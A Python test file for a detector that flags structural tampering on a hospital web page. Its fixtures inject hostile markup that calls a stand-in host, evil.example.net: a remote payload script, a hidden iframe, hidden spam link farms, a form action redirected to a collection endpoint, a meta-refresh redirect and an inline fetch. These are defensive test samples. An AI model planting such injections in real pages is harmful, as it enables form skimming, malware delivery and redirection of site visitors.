"""Structural detector: catches injections that text and pixel diffs cannot."""

from app.services.diff.structure import compare_structure, extract_structure

BASE_URL = "https://hospital.example.com/th/home"

CLEAN_PAGE = """
<html><head>
  <link rel="stylesheet" href="/assets/site.css">
  <script src="/assets/app.js"></script>
  <script src="https://www.googletagmanager.com/gtag/js?id=G-123"></script>
</head><body>
  <main><h1>Welcome</h1></main>
  <a href="/th/contact">Contact</a>
  <a href="https://partner.example.org/info">Partner</a>
  <form action="/th/appointment" method="post"><input name="name"></form>
</body></html>
"""


def facts(html: str, allowed: tuple[str, ...] = ()) -> set[str]:
    return extract_structure(html, BASE_URL, allowed)


def test_injected_external_script_is_detected():
    defaced = CLEAN_PAGE.replace(
        "</body>", '<script src="https://evil.example.net/payload.js"></script></body>'
    )

    diff = compare_structure(facts(CLEAN_PAGE), facts(defaced))

    assert diff.changed
    assert diff.score > 0.0
    assert any("evil.example.net/payload.js" in fact for fact in diff.added)
    assert diff.removed == ()
    assert "evil.example.net" in diff.summary


def test_hidden_iframe_is_detected_even_though_it_is_invisible():
    """A display:none iframe moves no pixels and contributes no text."""
    defaced = CLEAN_PAGE.replace(
        "</body>",
        '<iframe src="https://evil.example.net/frame" style="display:none"></iframe></body>',
    )

    diff = compare_structure(facts(CLEAN_PAGE), facts(defaced))

    assert any(fact.startswith("iframe:") and "evil.example.net" in fact for fact in diff.added)


def test_hidden_spam_links_are_detected_by_host():
    """inner_text() skips display:none nodes, so text diff cannot see these."""
    defaced = CLEAN_PAGE.replace(
        "</body>",
        '<div style="display:none">'
        '<a href="https://spam-pharma.example.net/a">buy</a>'
        '<a href="https://spam-pharma.example.net/b">buy</a>'
        "</div></body>",
    )

    diff = compare_structure(facts(CLEAN_PAGE), facts(defaced))

    # Recorded once per host, not once per link, so a link farm is one finding.
    assert diff.added == ("link-host:spam-pharma.example.net",)


def test_repointed_form_action_is_detected():
    defaced = CLEAN_PAGE.replace(
        'action="/th/appointment"', 'action="https://evil.example.net/collect"'
    )

    diff = compare_structure(facts(CLEAN_PAGE), facts(defaced))

    assert any("evil.example.net/collect" in fact for fact in diff.added)
    assert any("/th/appointment" in fact for fact in diff.removed)


def test_meta_refresh_redirect_is_detected():
    defaced = CLEAN_PAGE.replace(
        "<head>", '<head><meta http-equiv="refresh" content="0;url=https://evil.example.net/">'
    )

    diff = compare_structure(facts(CLEAN_PAGE), facts(defaced))

    assert any(fact.startswith("meta-refresh:") for fact in diff.added)


def test_modified_inline_script_is_detected_by_content_hash():
    original = CLEAN_PAGE.replace("</body>", "<script>console.log(1)</script></body>")
    modified = CLEAN_PAGE.replace("</body>", "<script>fetch('//evil.example.net')</script></body>")

    diff = compare_structure(facts(original), facts(modified))

    assert len(diff.added) == 1
    assert len(diff.removed) == 1
    assert diff.added[0].startswith("inline-script:")
    # Only the digest is stored, never the script body.
    assert "evil.example.net" not in diff.added[0]


def test_unchanged_page_reports_no_structural_change():
    diff = compare_structure(facts(CLEAN_PAGE), facts(CLEAN_PAGE))

    assert not diff.changed
    assert diff.score == 0.0
    assert diff.summary == "No structural changes detected."


def test_cache_busting_query_string_is_a_real_change_not_noise():
    """Per-load noise does not exist here: a changed asset URL means a new deploy.

    This is why the structural detector compares URL sets rather than markup —
    a set only moves when the page really references something different.
    """
    redeployed = CLEAN_PAGE.replace("/assets/app.js", "/assets/app.js?v=2")

    diff = compare_structure(facts(CLEAN_PAGE), facts(redeployed))

    assert diff.changed


def test_allowlisted_hosts_are_ignored_including_subdomains():
    allowed = ("googletagmanager.com", "partner.example.org")

    unfiltered = facts(CLEAN_PAGE)
    filtered = facts(CLEAN_PAGE, allowed)

    assert any("googletagmanager.com" in fact for fact in unfiltered)
    assert not any("googletagmanager.com" in fact for fact in filtered)
    assert not any("partner.example.org" in fact for fact in filtered)
    # The site's own assets are still tracked.
    assert any("/assets/app.js" in fact for fact in filtered)


def test_allowlist_does_not_hide_a_lookalike_host():
    """`evil-googletagmanager.com` must not be covered by `googletagmanager.com`."""
    defaced = CLEAN_PAGE.replace(
        "</body>", '<script src="https://evil-googletagmanager.com/x.js"></script></body>'
    )
    allowed = ("googletagmanager.com",)

    diff = compare_structure(facts(CLEAN_PAGE, allowed), facts(defaced, allowed))

    assert any("evil-googletagmanager.com" in fact for fact in diff.added)


def test_relative_and_absolute_urls_for_the_same_asset_match():
    absolute = CLEAN_PAGE.replace(
        'src="/assets/app.js"', 'src="https://hospital.example.com/assets/app.js"'
    )

    diff = compare_structure(facts(CLEAN_PAGE), facts(absolute))

    assert not diff.changed


def test_same_site_links_are_not_recorded_as_outbound_hosts():
    assert not any(
        fact == "link-host:hospital.example.com" for fact in facts(CLEAN_PAGE)
    )


def test_malformed_html_still_yields_what_could_be_parsed():
    broken = '<html><body><script src="https://evil.example.net/x.js"></script><div><p>'

    parsed = extract_structure(broken, BASE_URL)

    assert "script:https://evil.example.net/x.js" in parsed
